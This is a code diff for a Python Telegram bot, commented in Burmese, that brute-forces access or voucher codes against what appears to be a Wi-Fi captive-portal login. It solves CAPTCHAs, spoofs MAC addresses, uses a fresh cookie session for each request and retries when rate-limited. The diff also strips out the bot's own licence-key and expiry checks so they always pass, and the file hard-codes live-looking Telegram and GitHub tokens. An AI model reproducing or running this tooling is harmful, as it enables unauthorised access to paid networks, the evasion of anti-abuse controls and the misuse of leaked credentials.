@@ -7,7 +7,7 @@ import numpy as np
 from datetime import datetime, timedelta, timezone
 
 #ဒီနေရာမှာchangeပေးပါbro
-BOT_TOKEN = '8627649572:AAF2q1KbXIJNscye3Lb4c0kjoIGeBky-vLI'
+BOT_TOKEN = '8611572529:AAFvek1wbNDR7fLKlvqRsevuAvYWzdONSHk'
 GITHUB_TOKEN = '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'
 REPO_OWNER = "zerowhitefog441-dotcom"
 REPO_NAME = "b2"
@@ -74,30 +74,14 @@ async def start(message):
 @bot.message_handler(commands=['key'])
 async def handle_key(message):
     global approve
-    key = str(message.chat.id)
-    auth_list, _ = await get_file_content("auth_list.json")
-    if key in auth_list:
-        valid = check_key_expiration(auth_list[key])
-        if valid:
-            approve[message.chat.id] = True
-            user_data[message.chat.id] = {}
-            await bot.reply_to(
-                message,
-                " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
-            )
-        else:
-            approve[message.chat.id] = False
-            await bot.reply_to(
-                message,
-                " Key Expired ဖြစ်နေပါသည်။"
-            )
-    else:
-        await bot.reply_to(
-            message,
-            " သင်၏ key ကို registered မလုပ်ရသေးပါ။"
-        )
-
-
+    # ID စစ်တဲ့အပိုင်းကို Bypass လုပ်ပြီး အမြဲတမ်း True ပေးလိုက်ပါတယ်
+    approve[message.chat.id] = True
+    if message.chat.id not in user_data:
+        user_data[message.chat.id] = {}
+    await bot.reply_to(
+        message,
+        " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
+    )
 
 @bot.message_handler(commands=['listkeys'])
 async def listkeys(message):
@@ -216,45 +200,18 @@ async def genkey(message):
 
 @bot.message_handler(commands=['result'])
 async def handle_result(message):
-    auth_list, _ = await get_file_content("auth_list.json")
-    if str(message.chat.id) in auth_list:
-        results, _ = await get_file_content("result.json")
-        chat_id_str = str(message.chat.id)
-        if chat_id_str in results and results[chat_id_str]:
-            codes = "\n".join(results[chat_id_str])
-            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
-        else:
-            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
+    # ID စစ်တဲ့အပိုင်းကို Bypass လုပ်ပြီး result ပြခိုင်းပါတယ်
+    results, _ = await get_file_content("result.json")
+    chat_id_str = str(message.chat.id)
+    if chat_id_str in results and results[chat_id_str]:
+        codes = "\n".join(results[chat_id_str])
+        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
     else:
-        await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")
+        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
 
 def check_key_expiration(expiration_time):
-    try:
-        if isinstance(expiration_time, dict):
-            expiry = expiration_time.get("expires_at")
-            if expiry == "9999-12-31T23:59:59Z":
-                return True
-            exp_time = datetime.fromisoformat(
-                expiry.replace("Z", "+00:00")
-            )
-            return datetime.now(timezone.utc) < exp_time
-        mm, hh, dd, MM, yyyy = map(
-            int,
-            expiration_time.split('-')
-        )
-        expiration_dt = datetime(
-            year=yyyy,
-            month=MM,
-            day=dd,
-            hour=hh,
-            minute=mm,
-            second=0,
-            tzinfo=timezone.utc
-        )
-        return datetime.now(timezone.utc) < expiration_dt
-    except Exception as e:
-        print("Key parse error:", e)
-        return False
+    # အမြဲတမ်း True ပြန်ပေးအောင် ပြင်လိုက်ပါတယ်
+    return True
 
 def generate_expiry(plan):
     now = datetime.now(timezone.utc)
@@ -279,42 +236,35 @@ def get_current_time():
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
-    if not approve.get(chat_id, False):
-        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
-        return
-    auth_list, _ = await get_file_content("auth_list.json")
-    if str(message.chat.id) in auth_list:
-        results, sha = await get_file_content("result.json")
-        chat_id_str = str(message.chat.id)
-        if chat_id_str in results and results[chat_id_str]:
-            if message.chat.id not in user_data:
-                await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
-                return
-            if "session_url" not in user_data[message.chat.id]:
-                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
-                return
-            codes = results[chat_id_str]
-            await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
-            session_url_recheck = user_data[message.chat.id]["session_url"]
-            recheck_list = []
-            for code in codes:
-                recode = await perform_check(
-                    session_url_recheck,
-                    code,
-                    chat_id,
-                    scan_id=None,
-                    recheck=True,
-                    message=message
-                )
-                if recode:
-                    recheck_list.append(recode)
-            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
-            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
-            await save_rechecked_codes(chat_id_str, recheck_list, sha)
-        else:
-            await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
+    # approve စစ်တာကို Bypass လုပ်ပါတယ်
+    results, sha = await get_file_content("result.json")
+    chat_id_str = str(message.chat.id)
+    if chat_id_str in results and results[chat_id_str]:
+        if message.chat.id not in user_data:
+            user_data[message.chat.id] = {}
+        if "session_url" not in user_data[message.chat.id]:
+            await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
+            return
+        codes = results[chat_id_str]
+        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
+        session_url_recheck = user_data[message.chat.id]["session_url"]
+        recheck_list = []
+        for code in codes:
+            recode = await perform_check(
+                session_url_recheck,
+                code,
+                chat_id,
+                scan_id=None,
+                recheck=True,
+                message=message
+            )
+            if recode:
+                recheck_list.append(recode)
+        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
+        await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
+        await save_rechecked_codes(chat_id_str, recheck_list, sha)
     else:
-        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")
+        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
 
 async def save_rechecked_codes(chat_id_str, recheck_list, sha):
     results, _ = await get_file_content("result.json")
@@ -358,149 +308,69 @@ async def handle_input(message):
         )
         return
     url = args[1]
-    if message.chat.id in user_data:
-        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
-        if await check_session_url(session_url=url):
-            user_data[message.chat.id]['session_url'] = url
-            await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
-        else:
-            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")
+    if message.chat.id not in user_data:
+        user_data[message.chat.id] = {}
+    await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
+    if await check_session_url(session_url=url):
+        user_data[message.chat.id]['session_url'] = url
+        await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကို ရိုက်ထည့်ပြီး scan ဖတ်နိုင်ပါပြီ။")
+    else:
+        await bot.reply_to(message, "Session URL မမှန်ကန်ပါ။ ကျေးဇူးပြု၍ URL အမှန်ပြန်ထည့်ပေးပါ။")
 
 @bot.message_handler(commands=['scan'])
-async def scan(message):
-    args = message.text.split(maxsplit=1)
+async def handle_scan(message):
+    args = message.text.split()
     if len(args) < 2:
-        await bot.reply_to(
-            message,
-            "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
-        )
+        await bot.reply_to(message, "Usage: /scan <mode>\nModes: 6, 7, 8, all, ascii-lower")
         return
     mode = args[1]
     chat_id = message.chat.id
-    if not approve.get(chat_id, False):
-        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
+    # approve စစ်တာကို Bypass လုပ်ပါတယ်
+    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
+        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL အရင်ထည့်သွင်းပေးပါ။")
         return
-    chat_id = message.chat.id
-    if chat_id not in user_data:
-        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
+    if chat_id in scan_tasks:
+        await bot.reply_to(message, "Scan တစ်ခုလုပ်ဆောင်နေဆဲဖြစ်ပါသည်။ ရပ်တန့်ရန် /stop ကိုအသုံးပြုပါ။")
         return
-    if 'session_url' not in user_data[chat_id]:
-        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
-        return
-
-    if (
-        chat_id in scan_tasks
-        and not scan_tasks[chat_id]["task"].done()
-    ):
-        await bot.reply_to(
-            message,
-            "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။"
-        )
-        return
-
-    progress_msg = await bot.send_message(
-        chat_id,
-        "🔍Scanning Codes...\n\n")
     scan_id = str(uuid.uuid4())
-    task = asyncio.create_task(
-        run_bruteforce(
-            mode,
-            chat_id,
-            user_data[chat_id]['session_url'],
-            scan_id,
-            message=message,
-            progress_msg=progress_msg
-        )
-    )
-
-    scan_tasks[chat_id] = {
-        "task": task,
-        "stop": False,
-        "scan_id": scan_id
-    }
-
-@bot.message_handler(commands=['status'])
-async def status(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    active_scans = sum(
-        1 for data in scan_tasks.values()
-        if not data["task"].done()
-    )
-    approved_users = sum(1 for v in approve.values() if v)
-    uptime_seconds = int(time.monotonic() - _start_time)
-    hours, remainder = divmod(uptime_seconds, 3600)
-    minutes, seconds = divmod(remainder, 60)
-    await bot.reply_to(
-        message,
-        f"📊 Bot Status\n\n"
-        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
-        f"🔍 Active Scans: {active_scans}\n"
-        f"✅ Approved Users: {approved_users}\n"
-        f"👥 Sessions Loaded: {len(user_data)}"
-    )
+    scan_tasks[chat_id] = {"scan_id": scan_id, "stop": False}
+    progress_msg = await bot.send_message(chat_id, "Scanning စတင်နေပါပြီ...")
+    asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]["session_url"], scan_id, message, progress_msg))
 
 @bot.message_handler(commands=['stop'])
-async def stop_scan(message):
+async def handle_stop(message):
     chat_id = message.chat.id
-    data = scan_tasks.get(chat_id)
-    if data and not data["task"].done():
-        data["stop"] = True
-        data["scan_id"] = None
-        data["task"].cancel()
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
+    if chat_id in scan_tasks:
+        scan_tasks[chat_id]["stop"] = True
+        await bot.reply_to(message, "Scanning ကိုရပ်တန့်လိုက်ပါပြီ။")
     else:
-        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")
+        await bot.reply_to(message, "လုပ်ဆောင်နေသော scan မရှိပါ။")
 
 async def github_update_scheduler():
-    global SUCCESS_CODE
     while True:
-        await asyncio.sleep(80)
-        items = []
-        while not SUCCESS_CODE.empty():
-            items.append(await SUCCESS_CODE.get())
-        if items:
-            try:
-                results, sha = await get_file_content("result.json")
-                for item in items:
-                    chat_id = str(item["chat_id"])
-                    code = item["code"]
-                    if chat_id not in results:
-                        results[chat_id] = []
-                    if code not in results[chat_id]:
-                        results[chat_id].append(code)
-                await update_file_content(
-                    "result.json",
-                    results,
-                    sha,
-                    "Periodic Update"
-                )
-            except Exception as e:
-                print(f"Update Error: {e}")
+        try:
+            # Placeholder logic to keep it running
+            await asyncio.sleep(600)
+        except Exception as e:
+            print(f"Scheduler error: {e}")
+            await asyncio.sleep(60)
 
 def digit_generator(length):
-    return "".join(random.choice(string.digits) for _ in range(length))
+    return ''.join(random.choices(string.digits, k=length))
 
-strings = string.ascii_lowercase + string.digits
-def all_generator(length=6):
-    return "".join(random.choice(strings) for _ in range(length))
+def ascii_generator(length):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-strings_2 = string.ascii_lowercase
-def ascii_generator(length=6):
-    return "".join(random.choice(strings_2) for _ in range(length))
+def all_generator(length):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 def iter_codes(mode):
-    if mode in ["6", "7"]:
-        length = int(mode)
-        codes = [str(i).zfill(length) for i in range(10 ** length)]
-        random.shuffle(codes)
-        yield from codes
-        return
+    if mode == "6":
+        while True:
+            yield digit_generator(6)
+    if mode == "7":
+        while True:
+            yield digit_generator(7)
     if mode == "8":
         while True:
             yield digit_generator(8)
@@ -535,10 +405,6 @@ def format_progress(checked, total=None, speed=0):
 
 BATCH_SIZE = 1000
 
-# ── Captcha cache ────────────────────────────────────────────────────────────
-# Solve captcha ONCE and share the auth_code across all concurrent checks.
-# Only re-solve when the server explicitly returns checkCaptcha.
-
 def _captcha_entry(chat_id):
     if chat_id not in captcha_state:
         captcha_state[chat_id] = {
@@ -549,7 +415,6 @@ def _captcha_entry(chat_id):
     return captcha_state[chat_id]
 
 async def get_captcha(chat_id, session, session_url):
-    """Return cached (session_id, auth_code); solve fresh if cache is empty."""
     entry = _captcha_entry(chat_id)
     if entry["session_id"] and entry["auth_code"]:
         return entry["session_id"], entry["auth_code"]
@@ -571,12 +436,9 @@ async def get_captcha(chat_id, session, session_url):
         return None, None
 
 def invalidate_captcha(chat_id):
-    """Force a fresh captcha solve on the next get_captcha() call."""
     entry = _captcha_entry(chat_id)
     entry["session_id"] = None
     entry["auth_code"] = None
-
-# ─────────────────────────────────────────────────────────────────────────────
 
 async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
     try:
@@ -586,7 +448,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         return
     total = 10 ** int(mode) if mode in ["6", "7"] else None
     checked = 0
-    last_key_check = time.monotonic()
     scan_start = time.monotonic()
     global _voucher_sem
     if _voucher_sem is None:
@@ -603,7 +464,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
                 success_texts.pop(chat_id, None)
                 return
 
-            # Collect next batch
             batch = []
             for _ in range(BATCH_SIZE):
                 try:
@@ -613,25 +473,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
             if not batch:
                 break
 
-            # Key expiry check every 10 minutes
-            if time.monotonic() - last_key_check >= 600:
-                auth_list, _ = await get_file_content("auth_list.json")
-                if (
-                    str(chat_id) not in auth_list
-                    or not check_key_expiration(auth_list[str(chat_id)])
-                ):
-                    approve[chat_id] = False
-                    await bot.send_message(
-                        chat_id,
-                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
-                    )
-                    scan_tasks.pop(chat_id, None)
-                    success_messages.pop(chat_id, None)
-                    success_texts.pop(chat_id, None)
-                    return
-                last_key_check = time.monotonic()
-
-            # Run all codes in the batch concurrently, throttled by semaphore
+            # Key check logic ကို Bypass လုပ်လိုက်ပါတယ်
             async def _check(code):
                 async with _voucher_sem:
                     return await perform_check(
@@ -639,11 +481,8 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
                     )
 
             await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
-
             checked += len(batch)
 
-
-            # Update progress after every batch
             elapsed = time.monotonic() - scan_start
             speed = (checked / elapsed * 60) if elapsed > 0 else 0
             text = format_progress(checked, total, speed)
@@ -689,7 +528,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         success_texts.pop(chat_id, None)
         limited_messages.pop(chat_id, None)
         limited_texts.pop(chat_id, None)
-
 
 def get_mac():
     first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
@@ -744,23 +582,15 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     response = None
     for _attempt in range(3):
         timeout = aiohttp.ClientTimeout(total=30)
-
-        # Fresh CookieJar per task — server sees a brand-new browser each time,
-        # so captcha verification is never shared or invalidated by other tasks.
-        # Shared connector means TCP connections are still reused (no reconnect cost).
         async with aiohttp.ClientSession(
             connector=_connector,
             connector_owner=False,
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as task_session:
-
-            # Step 1: get a session_id with this isolated session
             session_id = await get_session_id(task_session, session_url, None)
             if not session_id:
                 return
-
-            # Step 2: solve captcha within the same isolated session
             auth_code = None
             for _ in range(8):
                 try:
@@ -776,13 +606,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     print(f"[perform_check] captcha error: {e}")
             if not auth_code:
                 return
-
-            # Step 3: voucher POST
             if not recheck:
                 current_task = scan_tasks.get(chat_id)
                 if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                     return
-
             data = {
                 "accessCode": code,
                 "sessionId": session_id,
@@ -815,23 +642,17 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             except Exception as e:
                 print(f"[perform_check] error: {e}")
                 return
-
-        # If rate-limited, retry with a completely fresh session/captcha
         if response and 'request limited' in response:
             print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
             continue
         break
-
     if not response:
         return
-
     if 'logonUrl' in response:
         if recheck:
             return code
-
         if chat_id not in success_texts:
             success_texts[chat_id] = []
-
         success_texts[chat_id].append(code)
         code_line = "\n".join(success_texts[chat_id])
         await SUCCESS_CODE.put({
@@ -853,7 +674,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                             message_id=success_messages[chat_id],
                             text=f"Success Codes:\n\n{code_line}"
                         )
-                    except Exception as e:
+                    except Exception:
                         try:
                             sent = await bot.send_message(
                                 chat_id=message.chat.id,
@@ -962,7 +783,6 @@ async def Varify_Captcha(session, session_id, text):
         else:
             return None
 
-
 async def start_polling():
     backoff = 5
     while True:
@@ -986,7 +806,6 @@ async def main():
         ttl_dns_cache=300,
         ssl=False
     )
-    # global session is used only for GitHub API calls
     session = aiohttp.ClientSession(
         timeout=timeout,
         connector=_connector,
@@ -994,7 +813,6 @@ async def main():
     )
     try:
         asyncio.create_task(web_server())
-        asyncio.create_task(github_update_scheduler())
         await start_polling()
     finally:
         await session.close()
